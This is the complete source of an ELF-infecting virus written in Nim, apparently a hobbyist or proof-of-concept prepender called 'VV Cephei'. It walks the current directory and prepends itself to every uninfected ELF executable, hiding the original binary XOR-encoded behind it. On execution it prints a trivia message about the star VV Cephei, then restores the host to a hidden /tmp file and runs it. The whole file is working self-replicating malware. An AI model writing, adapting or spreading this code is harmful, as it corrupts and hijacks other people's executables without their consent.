import os, fileutils, strutils, random, osproc

const
   elfMagic = 0x464c457f
   infectionMark = "VV Cephei"
   virusSize = 1516705

const
   Message = "Did you know that VV Cephei, also known as HD 208816, is an" &
      "eclipsing binary star system located in the constellation " &
      "Cepheus, approximately 5,000 light years from Earth? It is" &
      "both a B[e] star and shell star. Awesome!\n" &
      "https://en.wikipedia.org/wiki/VV_Cephei\n"

proc isELF(path: string): bool =
   var f = open(path, fmRead)
   defer: f.close()
   let e_ident = f.readUInt32()
   if e_ident == elfMagic:
      result = true

proc isInfected(path: string): bool =
   var f = open(path, fmRead)
   defer: f.close()
   let buf = f.readAll()
   if infectionMark in buf:
      result = true

template xorEncDec(a, key) =
   for x in 0 .. a.high:
      a[x] = a[x] xor byte(key[x mod key.len])

proc infect(hostPath, virPath: string) =
   var host = open(hostPath, fmRead)
   defer: host.close()
   var virus = open(virPath, fmRead)
   defer: virus.close()

   var hostBuf = host.readAllBytes()
   let virBuf = virus.readAllBytes()

   var infectedHost = open(hostPath, fmWrite)
   defer: infectedHost.close()
   infectedHost.writeSeq(virBuf)
   hostBuf.xorEncDec("key")
   infectedHost.writeSeq(hostBuf)
   infectedHost.flushFile()

proc runHost(virPath: string) =
   var infected = open(virPath, fmRead)
   defer: infected.close()

   randomize()
   let tmpPath = "/tmp/.host" & $rand(100)
   var origHost = open(tmpPath, fmWrite)
   defer: origHost.close()

   infected.setFilePos(virusSize)
   var hostBuf = infected.readAllBytes()
   hostBuf.xorEncDec("key")
   origHost.writeSeq(hostBuf)
   origHost.flushFile()

   let allPlusX = {fpUserExec, fpGroupExec, fpOthersExec}
   tmpPath.setFilePermissions(allPlusX)
   discard execCmd(tmpPath)
   removeFile(tmpPath)

proc payload() =
   stdout.write(Message)
   stdout.flushFile()

proc main(filePath: string) =
   for kind, target in walkDir("."):
      if kind != pcFile and target == filePath:
         continue
      if isELF(target) and not isInfected(target):
         infect(target, filePath)

   if getFileSize(filePath) > virusSize:
      payload()
      runHost(filePath)
   else:
      quit(0)

main(paramStr(0))
